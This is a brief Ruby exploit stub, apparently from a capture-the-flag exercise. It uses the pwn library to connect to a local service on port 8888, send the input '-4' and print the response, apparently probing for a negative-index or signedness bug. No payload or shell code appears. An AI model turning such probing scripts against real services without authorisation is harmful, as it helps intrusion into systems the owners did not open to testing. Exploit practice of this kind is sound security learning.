#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'

context.arch = 'i386'
context.log_level = :debug

$z = Sock.new 'localhost', 8888
$z.recvuntil(': ')
$z.sendline("-4")
puts $z.recvuntil("\n")